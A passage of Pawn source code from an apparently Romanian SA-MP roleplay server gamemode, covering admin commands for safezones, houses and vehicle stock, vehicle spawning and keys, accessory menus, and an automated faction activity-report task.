		case 9: SetPlayerCameraPos(playerid, 2215.8022, -1076.6887, 1052.4047), SetPlayerCameraLookAt(playerid, 2214.8125, -1076.5696, 1052.2395), SetPlayerInterior(playerid, 1);
		case 10: SetPlayerCameraPos(playerid, 267.8929, 304.8710, 1000.8421), SetPlayerCameraLookAt(playerid, 268.8906, 304.9142, 1000.6469), SetPlayerInterior(playerid, 2);
		case 11: SetPlayerCameraPos(playerid, 245.2803, 307.2553, 1000.2034), SetPlayerCameraLookAt(playerid, 245.4770, 306.2764, 999.9384), SetPlayerInterior(playerid, 1);

		case 12: SetPlayerCameraPos(playerid, -726.296447, 1583.010864, 3.056015), SetPlayerCameraLookAt(playerid, -730.181274, 1586.031982, 2.172098), SetPlayerInterior(playerid, 10);
		case 13: SetPlayerCameraPos(playerid, 231.6437, 1186.1727, 1081.5111), SetPlayerCameraLookAt(playerid, 231.8882, 1187.1407, 1081.3771), SetPlayerInterior(playerid, 3);
		case 14: SetPlayerCameraPos(playerid, 487.8189, 1398.1814, 1082.1277), SetPlayerCameraLookAt(playerid, 488.1149, 1399.1350, 1082.0073), SetPlayerInterior(playerid, 2);
		case 15: SetPlayerCameraPos(playerid, 17.5855, 1341.0245, 1087.9324), SetPlayerCameraLookAt(playerid, 18.5301, 1341.3497, 1087.7039), SetPlayerInterior(playerid, 10);
		case 16: SetPlayerCameraPos(playerid, -282.8742, 1469.5415, 1086.3295), SetPlayerCameraLookAt(playerid, -283.7869, 1469.9467, 1086.2946), SetPlayerInterior(playerid, 15);
		case 17: SetPlayerCameraPos(playerid, -261.3119, 1453.3258, 1086.6284), SetPlayerCameraLookAt(playerid, -262.2391, 1453.6963, 1086.4338), SetPlayerInterior(playerid, 4);
		case 18: SetPlayerCameraPos(playerid, 86.9224, 1322.4597, 1086.1943), SetPlayerCameraLookAt(playerid, 86.5379, 1323.3815, 1086.0942), SetPlayerInterior(playerid, 9);
		case 19: SetPlayerCameraPos(playerid, 2320.5571, -1025.0186, 1051.2029), SetPlayerCameraLookAt(playerid, 2320.2698, -1024.0619, 1051.3535), SetPlayerInterior(playerid, 9);
		case 20: SetPlayerCameraPos(playerid, 2491.5051, -1696.2813, 1015.5330), SetPlayerCameraLookAt(playerid, 2492.0032, -1697.1469, 1015.3875), SetPlayerInterior(playerid, 3);
		case 21: SetPlayerCameraPos(playerid, 2195.4080, -1200.0920, 1049.8566), SetPlayerCameraLookAt(playerid, 2194.8584, -1200.9266, 1049.6566), SetPlayerInterior(playerid, 6);
		case 22: SetPlayerCameraPos(playerid, 376.9280, 1416.3525, 1082.3102), SetPlayerCameraLookAt(playerid, 375.9368, 1416.4741, 1082.1262), SetPlayerInterior(playerid, 15);
		case 23: SetPlayerCameraPos(playerid, 2262.5979, -1211.7606, 1049.7876), SetPlayerCameraLookAt(playerid, 2261.6389, -1211.4824, 1049.5773), SetPlayerInterior(playerid, 10);
		case 24: SetPlayerCameraPos(playerid, 445.7094, 1396.8407, 1086.2308), SetPlayerCameraLookAt(playerid, 445.9051, 1397.8197, 1085.9220), SetPlayerInterior(playerid, 2);
		case 25: SetPlayerCameraPos(playerid, 386.4680, 1470.9492, 1081.3369), SetPlayerCameraLookAt(playerid, 385.4917, 1471.1572, 1081.1287), SetPlayerInterior(playerid, 15);
		case 26: SetPlayerCameraPos(playerid, 21.8199, 1403.2657, 1085.2496), SetPlayerCameraLookAt(playerid, 22.0875, 1404.2279, 1085.0442), SetPlayerInterior(playerid, 5);
		case 27: SetPlayerCameraPos(playerid, 2364.7788, -1134.1288, 1051.4226), SetPlayerCameraLookAt(playerid, 2365.0901, -1133.1803, 1051.2433), SetPlayerInterior(playerid, 8);
		case 28: SetPlayerCameraPos(playerid, 2237.0874, -1080.0449, 1049.6121), SetPlayerCameraLookAt(playerid, 2237.3455, -1079.0806, 1049.4729), SetPlayerInterior(playerid, 2);
		case 29: SetPlayerCameraPos(playerid, 294.5133, 1472.1792, 1081.0778), SetPlayerCameraLookAt(playerid, 294.7190, 1473.1558, 1080.9685), SetPlayerInterior(playerid, 15);
		case 30: SetPlayerCameraPos(playerid, 220.7936, 1139.6627, 1083.8789), SetPlayerCameraLookAt(playerid, 221.0227, 1140.6345, 1083.6494), SetPlayerInterior(playerid, 4);
		case 31: SetPlayerCameraPos(playerid, -69.9296, 1350.8909, 1081.0660), SetPlayerCameraLookAt(playerid, -69.7377, 1351.8710, 1080.7916), SetPlayerInterior(playerid, 6);
		case 32: SetPlayerCameraPos(playerid, 259.8786, 1237.9282, 1085.5304), SetPlayerCameraLookAt(playerid, 260.2392, 1238.8597, 1085.1702), SetPlayerInterior(playerid, 9);
		case 33: SetPlayerCameraPos(playerid, 2469.2764, -1699.1567, 1014.5864), SetPlayerCameraLookAt(playerid, 2468.3062, -1698.9172, 1014.3065), SetPlayerInterior(playerid, 2);

		case 34: SetPlayerCameraPos(playerid, 136.0863, 1364.8931, 1086.5968), SetPlayerCameraLookAt(playerid, 136.4150, 1365.8356, 1086.3867), SetPlayerInterior(playerid, 5);
		case 35: SetPlayerCameraPos(playerid, 225.1230, 1021.7136, 1084.7102), SetPlayerCameraLookAt(playerid, 225.5872, 1022.5983, 1084.5348), SetPlayerInterior(playerid, 7);
		case 36: SetPlayerCameraPos(playerid, 231.2208, 1063.1127, 1085.9523), SetPlayerCameraLookAt(playerid, 231.6671, 1064.0059, 1085.5946), SetPlayerInterior(playerid, 6);
		case 37: SetPlayerCameraPos(playerid, 225.9759, 1115.1960, 1081.7931), SetPlayerCameraLookAt(playerid, 226.9668, 1115.0742, 1081.6378), SetPlayerInterior(playerid, 5);
	}
	return true;
}
redist::ShowShopTDs(playerid) {
	TextDrawShowForPlayer(playerid, ShopTD[0]);
	TextDrawShowForPlayer(playerid, ShopTD[1]);
	PlayerTextDrawShow(playerid, ShopTDs[0]);
	PlayerTextDrawShow(playerid, ShopTDs[1]);
	TextDrawShowForPlayer(playerid, ShopTD[4]);
	PlayerTextDrawSetString(playerid, ShopTDs[0], "Interior id: 1");
	PlayerTextDrawShow(playerid, ShopTDs[0]);
	SelectTextDraw(playerid, 0xFF0000FF);
	return true;
}
redist::HideShopTDs(playerid) {
	TextDrawHideForPlayer(playerid, ShopTD[0]);
	TextDrawHideForPlayer(playerid, ShopTD[1]);
	PlayerTextDrawHide(playerid, ShopTDs[0]);
	PlayerTextDrawHide(playerid, ShopTDs[1]);
	TextDrawHideForPlayer(playerid, ShopTD[4]);	
	SetCameraBehindPlayer(playerid);
	SetPlayerPos(playerid, pPos[playerid][0], pPos[playerid][1], pPos[playerid][2]);
	SetPlayerVirtualWorld(playerid, pVirtual[playerid]);
	SetPlayerInterior(playerid, pInteriorID[playerid]);
	player_selected[playerid]=0;
	CancelSelectTextDraw(playerid);
	return true;
}
AntiDeAMX() {
	new a[][] = {
 		"Unarmed (Fist)",
 		"Brass K"
 	};
	#pragma unused a
	return true;
}
cmd:addsafezone(playerid, params[]) {
	new range, Float: Pos[3];
    if(PlayerInfo[playerid][pAdmin] < 6) return SendClientMessage(playerid, COLOR_WHITE, "Nu ai acces!");
	if(sscanf(params, "i", range)) return SendClientMessage(playerid, COLOR_GREY, "USAGE: {FFFFFF}/addsafezone <raza>");
	if(range < 15) return SendClientMessage(playerid, COLOR_ERROR, "Eroare: {FFFFFF}Raza prea mica. (minim 15m)");
	GetPlayerPos(playerid, Pos[0], Pos[1], Pos[2]);
	gQuery[0] = EOS;
    mysql_format(SQL, gQuery, sizeof(gQuery), "INSERT INTO `safezones` (`X`, `Y`, `Z`, `Range`) VALUES ('%f', '%f', '%f', '%d')", Pos[0], Pos[1], Pos[2], range);
	mysql_tquery(SQL, gQuery, "SQL_InsertSafeZone", "iifff", playerid, range, Pos[0], Pos[1], Pos[2]);
	return true;
}
redist::SQL_InsertSafeZone(playerid, range, Float: x, Float: y, Float: z) {
	new i = cache_insert_id();
	SafeZone[i][szX] = x;
	SafeZone[i][szY] = y;
	SafeZone[i][szZ] = z;
	SafeZone[i][szRange] = range;
	SafeZone[i][szArea] = CreateDynamicCircle(SafeZone[i][szX], SafeZone[i][szY], SafeZone[i][szRange]);
	AreaID[SafeZone[i][szArea]] = i;
	AreaType[SafeZone[i][szArea]] = AREA_SAFEZONE;
	SendClientMessage(playerid, COLOR_GOLD, "Acest loc a fost adaugat cu succes in baza de date.");
	gString[0] = EOS;
	format(gString, 128, "Informatii: ID %d, Coordonate (%f, %f, %f), raza %d.", i, x, y, z, range);
	SendClientMessage(playerid, COLOR_GOLD, gString);
	return true;
}
cmd:editsafezone(playerid, params[]) {
	new szDialog[1024], szDialog2[1024];
    if(PlayerInfo[playerid][pAdmin] < 6) return SendClientMessage(playerid, COLOR_WHITE, "Nu ai acces!");
	for(new i = 0; i < MAX_SAFEZONES; i++) {
	    if(SafeZone[i][szRange] >= 15) {
	        format(szDialog, sizeof(szDialog), "%d. %s\n", i, Get3DZone(SafeZone[i][szX], SafeZone[i][szY], SafeZone[i][szZ]));
	        strcat(szDialog2, szDialog);
	    }
	}
	ShowPlayerDialog(playerid, DIALOG_EDITSF, DIALOG_STYLE_TABLIST, "Safezones:", szDialog2, "Select", "Cancel");
	return true;
}

cmd:createhouse(playerid, params[]) {
	new pret, nivel;
	if(!IsAdmin(playerid, 7)) return SendClientMessage(playerid, COLOR_GREY, "Nu ai acces!");
	if(player_selected[playerid]) return true;
	if(sscanf(params, "ii", pret, nivel)) return SendClientMessage(playerid, COLOR_GREY, "USAGE: {FFFFFF}/createhouse <price> <nivel>");
    PlayerTextDrawSetString(playerid, ShopTDs[1], "Seteaza");
	player_selected[playerid] = 8;
	SInterior[playerid] = 1;
	pPret[playerid] = pret;
	pNivel[playerid] = nivel;
	GetPlayerPos(playerid, pPos[playerid][0], pPos[playerid][1], pPos[playerid][2]);
    pInteriorID[playerid] = GetPlayerInterior(playerid), pVirtual[playerid] = GetPlayerVirtualWorld(playerid);
	SetInteriorCamera(playerid);
	ShowShopTDs(playerid);
	SetPlayerVirtualWorld(playerid, playerid+900);
	return true;
}

cmd:svs(playerid, params[]) {
	if(!IsAdmin(playerid, 7)) return SendClientMessage(playerid, COLOR_LGREEN, AdminOnly);
	new type, value;
	if(sscanf(params, "ii", type, value)) {
		SendClientMessage(playerid, COLOR_GREY, "USAGE: {FFFFFF}/svs <type> <value>");
		SendClientMessage(playerid, COLOR_WHITE, "(1) Infernus Premium | (2) Monster | NRG Premium (3) | Bullet Premium (4) | Sultan Premium (5) | Turismo Premium (6)");
		SendClientMessage(playerid, COLOR_WHITE, "(7) Vehicle Crate | (8) Premium Crate | (9) premium v2 crate");
		return true;
	}
	if type > sizeof ServerStock *then return SendClientMessage(playerid, COLOR_LGREEN, "Type invalid.");
	ServerStock[--type] = value;
	switch(type) {
		case 0: format(gString, 128, "Adminul %s a modificat stock-ul la Infernus [PREMIUM] in %d.", GetName(playerid), ServerStock[type]);
		case 1: format(gString, 128, "Adminul %s a modificat stock-ul la Monster in %d.", GetName(playerid), ServerStock[type]);
		case 2: format(gString, 128, "Adminul %s a modificat stock-ul la NRG [PREMIUM] in %d.", GetName(playerid), ServerStock[type]);
		case 3: format(gString, 128, "Adminul %s a modificat stock-ul la Bullet [PREMIUM] in %d.", GetName(playerid), ServerStock[type]);
		case 4: format(gString, 128, "Adminul %s a modificat stock-ul la Sultan [PREMIUM] in %d.", GetName(playerid), ServerStock[type]);
		case 5: format(gString, 128, "Adminul %s a modificat stock-ul la Turismo [PREMIUM] in %d.", GetName(playerid), ServerStock[type]);
		case 6: {
			format(gString, 256, "{FF7A7A}(stock: %d)\n{7556FF}Vehicle crate\n{FFFFFF}Use {7556FF}/buycrate {FFFFFF}to buy this crate\nCrate Price: {7556FF}5000 BPoints {FFFFFF}/ {7556FF}300 premium points", ServerStock[type]);
			UpdateDynamic3DTextLabelText(LabelCrates, -1, gString);
			format(gString, 128, "Adminul %s a adaugat %d vehicle crate in stock.", GetName(playerid), ServerStock[type]);
		}
		case 7: {
			format(gString, 256, "{FF7A7A}(stock: %d)\n{77FF00}Premium crate\n{FFFFFF}Use {77FF00}/buycrate {FFFFFF}to buy this crate\nCrate Price: {77FF00}500 premium points", ServerStock[type]);
			UpdateDynamic3DTextLabelText(LabelCrates1, -1, gString);
			format(gString, 128, "Adminul %s a adaugat %d Premium crate in stock.", GetName(playerid), ServerStock[type]);
		}
		case 8: {
			format(gString, 256, "{FF7A7A}(stock: %d)\n{77FF00}Premium Crate V2\n{FFFFFF}Use {77FF00}/buycrate {FFFFFF}to buy this crate\nCrate Price: {77FF00}500 premium points", ServerStock[type]);
			UpdateDynamic3DTextLabelText(LabelCrates2, -1, gString);
			format(gString, 128, "Adminul %s a adaugat %d Premium crate V2 in stock.", GetName(playerid), ServerStock[type]);
		}
		default: return true;
	}
	save_stock();
	SendAdminMessage(COLOR_YELLOW, gString, 6);
	return true;
}
save_stock() {
	gQuery[0] = EOS;
	mysql_format(SQL, gQuery, sizeof(gQuery), "UPDATE `stuff` SET `ServerStock`='%i %i %i %i %i %i %i %i %i' WHERE `ID`='1'", ServerStock[0], ServerStock[1], ServerStock[2], ServerStock[3], ServerStock[4], ServerStock[5], ServerStock[6], ServerStock[7], ServerStock[8]);
	mysql_tquery(SQL, gQuery, "", "");
}
stock SetCheckpoint(playerid) {
	new rand = random(5);
	switch(rand) {
		case 0: SetPlayerCheckpoint(playerid, 2566.9636,-2450.5378,13.6262, 5.0);
		case 1: SetPlayerCheckpoint(playerid, 2550.3438,-2221.8779,13.3113, 5.0);
		case 2: SetPlayerCheckpoint(playerid, 1767.1932,-2031.7592,13.7906, 5.0);
		case 3: SetPlayerCheckpoint(playerid, 2684.4473,-1110.4076,69.3969, 5.0);
		case 4: SetPlayerCheckpoint(playerid, 2311.5100,-1238.0265,24.0475, 5.0);
		case 5: SetPlayerCheckpoint(playerid, 797.5410,-617.5146,16.3359, 5.0);		
	}
	CP[playerid] = 60;
	return true;
}

stock SpawnPlayerCar(playerid, dbid) {
	if(dbid == -1) return true;
	if(CarInfo[dbid][Confiscated]) return true;
	if(CarInfo[dbid][cGarage]==-1){
		CarInfo[dbid][Spawned] = CreateVehicleEx(CarInfo[dbid][cModel],CarInfo[dbid][cLocationx],CarInfo[dbid][cLocationy],CarInfo[dbid][cLocationz],CarInfo[dbid][cAngle],CarInfo[dbid][cColorOne],CarInfo[dbid][cColorTwo]);
		SetVehicleVirtualWorld(CarInfo[dbid][Spawned], 0);
	} else {
		CarInfo[dbid][Spawned] = CreateVehicleEx(CarInfo[dbid][cModel],1373.8792,-36.7905,1000.7513,128.8800,CarInfo[dbid][cColorOne],CarInfo[dbid][cColorTwo]);
		SetVehicleVirtualWorld(CarInfo[dbid][Spawned], CarInfo[dbid][Spawned]);
		total_vehicle_in_garage[playerid] ++;
	}
	GiveVehicleKey(playerid, CarInfo[dbid][Spawned]);
	VehicleSQL[CarInfo[dbid][Spawned]] = dbid;
	if(CarInfo[dbid][cVip]) SetVehicleHealth(CarInfo[dbid][Spawned], 2000.0);
	Iter_Add(PersonalVSpawned, dbid);
	MyVehicleSpawn[playerid] ++;
	CarInfo[dbid][cOnline] = playerid;
	attach_vip_text(dbid);
	AttachNeon(dbid);

	Gas[CarInfo[dbid][Spawned]] = CarInfo[dbid][cFuel];
	new engine,lights,alarm,doors,bonnet,boot,objective;
	GetVehicleParamsEx(CarInfo[dbid][Spawned],engine,lights,alarm,doors,bonnet,boot,objective);
	SetVehicleParamsEx(CarInfo[dbid][Spawned],0,lights,alarm,CarInfo[dbid][cLock],bonnet,boot,objective);
	CarInfo[dbid][cTime] = 600;
	SetTunning(dbid);
	return true;
}

stock SpawnClanCar(dbid) {
	if(dbid == -1) return true;
	CarInfo[dbid][Spawned] = CreateVehicleEx(CarInfo[dbid][cModel],CarInfo[dbid][cLocationx],CarInfo[dbid][cLocationy],CarInfo[dbid][cLocationz],CarInfo[dbid][cAngle],CarInfo[dbid][cColorOne],CarInfo[dbid][cColorTwo]);
	VehicleSQL[CarInfo[dbid][Spawned]] = dbid;

	Iter_Add(PersonalVSpawned, dbid);
	new clan = CarInfo[dbid][cClan];
	ClanSpawn[clan] ++;

	nameobject[CarInfo[dbid][Spawned]] = CreateDynamicObject(19327, -2597.0762, -2638.4270, -5.3536, -87.6999, 90.4001, -87.1805);
	format(gString, 128, "{%s}%s\n%s", ClanInfo[clan][clColor], ClanInfo[clan][clName], ClanInfo[clan][clTag]);
	SetDynamicObjectMaterialText(nameobject[CarInfo[dbid][Spawned]], 0, gString, OBJECT_MATERIAL_SIZE_256x128, "Arial", 25, 1, -1, 0, 1);
	switch(CarInfo[dbid][cModel]) {
		case 560: AttachDynamicObjectToVehicle(nameobject[CarInfo[dbid][Spawned]], CarInfo[dbid][Spawned], 0.001281, -0.031064, 0.799423, 270.000000, -72.499961, -72.619377);
		case 411: AttachDynamicObjectToVehicle(nameobject[CarInfo[dbid][Spawned]], CarInfo[dbid][Spawned], -0.007179, -1.809922, 0.345012, 270.000000, 0.000000, -0.227281);
		case 495: AttachDynamicObjectToVehicle(nameobject[CarInfo[dbid][Spawned]], CarInfo[dbid][Spawned], 0.001114, -0.575842, 1.019607, -93.500038, -176.600158, -537.750976);
		case 579: AttachDynamicObjectToVehicle(nameobject[CarInfo[dbid][Spawned]], CarInfo[dbid][Spawned], -0.061755, -0.397705, 1.229994, 270.000000, 78.100013, 78.464035);
		case 482: AttachDynamicObjectToVehicle(nameobject[CarInfo[dbid][Spawned]], CarInfo[dbid][Spawned], -0.005479, -0.440506, 0.923802, -93.100189, 0.000000, -0.626388);
		case 480: AttachDynamicObjectToVehicle(nameobject[CarInfo[dbid][Spawned]], CarInfo[dbid][Spawned], 0.010557, -1.580164, 0.269652, 270.000000, 0.000000, -359.608337);
		case 494, 502, 503: AttachDynamicObjectToVehicle(nameobject[CarInfo[dbid][Spawned]], CarInfo[dbid][Spawned], 0.011076, -0.593440, 0.721932, -90.200088, 0.000000, -0.698576);
		case 409: AttachDynamicObjectToVehicle(nameobject[CarInfo[dbid][Spawned]], CarInfo[dbid][Spawned], -0.006276, -0.418243, 0.790085, -90.000083, 0.000000, -0.756195);
		case 541: AttachDynamicObjectToVehicle(nameobject[CarInfo[dbid][Spawned]], CarInfo[dbid][Spawned], 0.009455, -0.219650, 0.610000, 270.000000, 2.599999, -357.916931);
		case 556: AttachDynamicObjectToVehicle(nameobject[CarInfo[dbid][Spawned]], CarInfo[dbid][Spawned], -0.022844, -1.879892, 1.081047, -90.799919, 0.000000, -0.391171);
		case 522: AttachDynamicObjectToVehicle(nameobject[CarInfo[dbid][Spawned]], CarInfo[dbid][Spawned], 0.280631, 0.179313, 0.131688, 5.299997, 0.000000, -269.768890);
		case 487: AttachDynamicObjectToVehicle(nameobject[CarInfo[dbid][Spawned]], CarInfo[dbid][Spawned], 0.655894, -1.564441, 0.499657, 0.000000, 0.000000, -289.959808);
	}
	Gas[CarInfo[dbid][Spawned]] = CarInfo[dbid][cFuel];
	CarInfo[dbid][cTime] = 600;
	SetTunning(dbid);
	AttachNeon(dbid);
	return true;
}

cmd:givekey(playerid, params[]) {
	new idd = PersonalCar(playerid);
	if(idd == -1) return SendErrorMsg(playerid, "Nu esti in unul dintre vehiculele tale personale!");
	extract params -> new player:id; else return SendUsageMsg(playerid, "givekey [id]");	

	if(!IsPlayerConnected(id)) return SendErrorMsg(playerid, "Acel player nu este conectat.");
	if(!ProxDetectorS(30.0, id, playerid)) return SendErrorMsg(playerid, "Nu esti langa acel jucator!");
	if(id == playerid) return SendErrorMsg(playerid, "Nu poti folosi aceasta comanda asupra ta!");
	if(VehicleKey[id] != -1) return SendErrorMsg(playerid, "Acel player are deja cheia unui vehicul!");

	VehicleKey[id] = CarInfo[idd][Spawned]; GiveVehicleKey(id, CarInfo[idd][Spawned]);
	va_SendClientMessage(id, COLOR_LIGHTBLUE, "%s ti-a dat cheile vehiculului %s (%d).", GetName(playerid), GetVehicleName(CarInfo[idd][cModel]), CarInfo[idd][Spawned]);
	va_SendClientMessage(playerid, COLOR_LIGHTBLUE, "I-ai dat lui %s, cheile de la vehiculul %s.", GetName(id), GetVehicleName(CarInfo[idd][cModel]));
	return true;
}

CMD:throwkey(playerid, params[]) {
	#pragma unused params
	if(VehicleKey[playerid] == -1) return SendErrorMsg(playerid, "Nu ai cheile unui vehicul!");
	if(Iter_Contains(PlayerKeys[playerid], VehicleKey[playerid])) Iter_Remove(PlayerKeys[playerid], VehicleKey[playerid]);
	VehicleKey[playerid] = -1;
	SendClientMessage(playerid, COLOR_LIGHTBLUE, "Ai aruncat cheile!");
	return true;
}

stock saveCar(idd) {
	gQuery[0] = (EOS);
	mysql_format(SQL, gQuery, sizeof(gQuery),
		"UPDATE cars SET Model='%d', Locationx='%f', Locationy='%f', Locationz='%f', Angle='%f', ColorOne='%d', ColorTwo='%d', Owner='%s', Value='%d', License='%s', Userid='%d', Premium='%i'  WHERE ID=%d",
	CarInfo[idd][cModel], CarInfo[idd][cLocationx], CarInfo[idd][cLocationy], CarInfo[idd][cLocationz], CarInfo[idd][cAngle], CarInfo[idd][cColorOne], CarInfo[idd][cColorTwo], CarInfo[idd][cOwner], CarInfo[idd][cValue],
	CarInfo[idd][cLicense], CarInfo[idd][Userid], CarInfo[idd][cPremium], CarInfo[idd][cID]);
	mysql_tquery(SQL, gQuery, "", "");
	return true;
}

redist::ShowAccsTextdraws(playerid) {
	gString[0] = EOS;
	player_td_page[playerid] = 0;
	format(gString, 128, "%d/22~n~Name: ~b~~h~%s~w~~h~~n~Category: ~b~~h~%s~w~~h~~n~Owned: ~b~~h~%d", player_td_page[playerid]+1, Accessories[player_td_page[playerid]][e_AccessoryName], Accessories[player_td_page[playerid]][e_AccessoryCategory], PlayerInfo[playerid][pAccessories][player_td_page[playerid]]);
	PlayerTextDrawSetString(playerid, AccsPTD[1], gString);
	PlayerTextDrawShow(playerid, AccsPTD[1]); PlayerTextDrawShow(playerid, AccsPTD[0]); PlayerTextDrawShow(playerid, AccsPTD[2]);
	for(new i = 0; i < 5; i++) TextDrawShowForPlayer(playerid, AccsTD[i]);
	PlayerTextDrawSetPreviewModel(playerid, AccsPTD[0], Accessories[player_td_page[playerid]][e_Model]);
	PlayerTextDrawSetPreviewRot(playerid, AccsPTD[0], 28.000000, 245.000000, 56.000000, 0.792492);
	PlayerTextDrawShow(playerid, AccsPTD[0]);
	if(PlayerInfo[playerid][pAccessoriesOn][player_td_page[playerid]]) {
		PlayerTextDrawSetString(playerid, AccsPTD[2], "remove it");
		PlayerTextDrawBoxColor(playerid, AccsPTD[2], 0xcc3b31FF);
		PlayerTextDrawShow(playerid, AccsPTD[2]);
	}
	else {
		PlayerTextDrawSetString(playerid, AccsPTD[2], "Put it");
		PlayerTextDrawBoxColor(playerid, AccsPTD[2], 0x3D8517FF);
		PlayerTextDrawShow(playerid, AccsPTD[2]);
	}
	return 1;
}

redist::HideAccsTextdraws(playerid) {
	player_td_page[playerid] = 0;
	for(new i = 0; i < 3; i++) PlayerTextDrawHide(playerid, AccsPTD[i]);
	for(new i = 0; i < 5; i++) TextDrawHideForPlayer(playerid, AccsTD[i]);
	return 1;
}

cmd:processraport(playerid, params[]) {
	PlayerInfo[playerid][pRaportTime] = gettime()+10;
	SendClientMessage(playerid, -1, "raportul se va procesa curand");
	CheckFactionRaport(playerid);

	UpdateVar(playerid, "RaportExpire", PlayerInfo[playerid][pRaportTime]);
	return 1;
}

cmd:sellemotecrate(playerid, params[]) {
	if(!PlayerInfo[playerid][pCrates][6]) return SendErrorMsg(playerid, "Nu detii un emote crate.");
	return Dialog_Show(playerid, sellemotecrate, DIALOG_STYLE_MSGBOX, "Sell Emote Crate", "Esti sigur ca vrei sa vinzi un Emote Crate pentru $249,500,000?", "Da", "Nu");
}

Dialog:sellemotecrate(playerid, response, listitem, inputtext[]) {
	if(!response) return true;

	GivePlayerCash(playerid, 249500000);
	PlayerInfo[playerid][pCrates][6]--;
	return va_SendClientMessage(playerid, COLOR_YELLOW, "Ai vandut un Emote Crate si ai primit $249,500,000. (mai detii %d crate-uri emote)", PlayerInfo[playerid][pCrates][6]);
}

task ProcessRaport[60000]() {
	mysql_tquery(SQL, "SELECT * FROM `users` WHERE `Member`>'0' AND `RaportExpire`<UNIX_TIMESTAMP()", "SQL_cache_process_raport");
	return true;
}

redist::SQL_cache_process_raport() {
	for(new i, j = cache_num_rows(); i < j; i++) {
		new name[MAX_PLAYER_NAME], id, member, fw, rank, status, days, inactivity, commands[3], admin, helper, tester, responsabil, raportexpire, Float:hours; gString[0] = gQuery[0] = (EOS);
		cache_get_value_name_int(i, "id", id);
		cache_get_value_name(i, "name", name);
		cache_get_value_name_int(i, "Member", member);
		cache_get_value_name_int(i, "FWarn", fw);
		cache_get_value_name_int(i, "Rank", rank);
		cache_get_value_name_int(i, "Status", status);
		cache_get_value_name_int(i, "Days", days);
		cache_get_value_name_int(i, "FactionInactivity", inactivity);
		cache_get_value_name(i, "Raport", gQuery),				sscanf(gQuery, "a<i>[3]", commands);
		cache_get_value_name_int(i, "Admin", admin);
		cache_get_value_name_int(i, "Helper", helper);
		cache_get_value_name_int(i, "Tester", tester);
		cache_get_value_name_int(i, "Responsabil", responsabil);
		cache_get_value_name_int(i, "RaportExpire", raportexpire);
		cache_get_value_name_float(i, "ConnectedMonth", hours);
		new f_totalraport = FactionRaport[member][rank][0] + FactionRaport[member][rank][1] + FactionRaport[member][rank][2];
		new raporttime = gettime() + (86400*7);
		if(gettime() < raportexpire && raportexpire != -1) return true;

		if(status != -1) {
			CheckFactionRaport(status);
		} else {
			if(hours < 2.95) {
				format(gString,sizeof(gString),"Your raport has been successfully reviewed (incomplete). You have been kicked out of faction because you have < 2.95 hours.");
				InsertEmail(name, "AdmBot", gString);

				gString[0] = gQuery[0] = EOS;
				if(days >= 14) {
					format(gString, 128, "%s was uninvited by AdmBot from %s (rank %d) after %d days, without FP. Reason: incomplete faction raport (hours).", name, FactionName(member), rank, days);
					_query("UPDATE `users` SET `FPunish`='0' WHERE `id`='%i'", id);
				}
				else {
					format(gString, 128, "%s was uninvited by AdmBot from %s (rank %d) after %d days, with 30 FP. Reason: incomplete faction raport (hours).", name, FactionName(member), rank, days);
					_query("UPDATE `users` SET `FPunish`='30' WHERE `id`='%i'", id);
				}
				insertFactionLogs(-1, id, gString);
				_query("UPDATE `users` SET `Rank`='0', `Member`='0' WHERE `id`='%i'", id);
				return true;
			}
			if(inactivity != -1) {
				format(gString, sizeof(gString), "Your raport was not in considered because you have an active release.");
				InsertEmail(name, "AdmBot", gString);
				new inactivity2 = gettime() + (86400*7);
				_query("UPDATE `users` SET `free_request_inactivity`='%i', `FactionInactivity`='-1', `RaportExpire`='%i', `Raport`='0 0 0' WHERE `id`='%i'", inactivity2, raporttime, id);
				return true;
			}
			if(commands[0], commands[1], commands[2] >= ((admin != 0 || helper != 0 || tester != 0 || (member == 7 || member == 16 || member == 21 || member == 8 || member == 22 && responsabil)) ? (f_totalraport/2) : (f_totalraport)) && hours > 3.0) {
				if(rank < 5) {
					rank++;
					format(gString, 100, "Your raport has been successfully reviewed (completed). Your rank has been changed to %d.", rank);
					_query("UPDATE `users` SET `Rank`='%i' WHERE `id`='%i'", rank, id);
					InsertEmail(name, "AdmBot", gString);
					format(gString, sizeof gString, "%s completed their activity raport and their rank changed from %d to %d (auto)", name, rank-1, rank);
					factionLog(member, gString);
				}
				_query("UPDATE `users` SET `RaportExpire`='%i', `Raport`='0 0 0' WHERE `id`='%i'", raporttime, id);
				return true;
			}
			if(rank != 1) {
				SendClientMessage(status, COLOR_CLIENT, "Your raport has been successfully reviewed (incomplete). You receive a faction warn for incomplete raport.");
				format(gString,sizeof(gString),"Your raport has been successfully reviewed (incomplete). You receive a faction warn for incomplete raport.");
				InsertEmail(name, "AdmBot", gString);
				fw++;
				new fw_expire = gettime() + (7 * 86400);
				format(gString, sizeof gString, "%s received a faction warn for incomplete raport.", name);
				factionLog(member, gString);
				_query("UPDATE `users` SET `RaportExpire`='%i', `Raport`='0 0 0', `ExpFW`='%i', `FWarn`='%i' WHERE `id`='%i'", raporttime, fw_expire, fw, id);
			}
			format(gString,sizeof(gString),"Your raport has been successfully reviewed (incomplete). You have been kicked out of faction because you have rank 1.");
			InsertEmail(name, "AdmBot", gString);
			gString[0] = gQuery[0] = EOS;
			format(gString, 128, "%s was uninvited by AdmBot from %s (rank %d) after %d days, with 30 FP. Reason: incomplete faction raport.", name, FactionName(member), rank, days);
			insertFactionLogs(-1, id, gString);
			_query("UPDATE `users` SET `Member`='0',`Leader`='0',`Rank`='0',`FWarn`='0',`FPunish`='30',`Days`='0',`Tester`='0',`Responsabil`='0',`Raport`='0 0 0',`RaportExpire`='-1',`ExpFW`='-1', `FactionSpawn`='0' WHERE `ID`='%d'", id);
		}//offline
	}
	return true;
}

cmd:jobmenu(playerid) {
	if(!PlayerInfo[playerid][pJobOwner]) return SendErrorMsg(playerid, "Nu detii un job.");
	return Dialog_Show(playerid, jobmenu, DIALOG_STYLE_LIST, "Job menu", "Change description\nWithdraw\nBalance", "Select", "Cancel");
}

Dialog:jobmenu(playerid, response, listitem, inputtext[]) {
	if(!response) return true;
	new job = PlayerInfo[playerid][pJobOwner];
	switch(listitem) {
		case 0: {
			format(gString, sizeof(gString), "Descriere actuala: %s\nScrie mai jos descrierea pe care vrei sa o ai.", JobInfo[job][jDescription]);
			Dialog_Show(playerid, jobmenu_description, DIALOG_STYLE_INPUT, "Change description", gString, "Select", "Cancel");
		}
		case 1: {
			format(gString, sizeof(gString), "Balanta actuala: %s\nPoti retrage intre $1 si $500,000,000.", JobInfo[job][jBalance]);
			Dialog_Show(playerid, jobmenu_withdraw, DIALOG_STYLE_INPUT, "Withdraw", gString, "Select", "Cancel");
		}
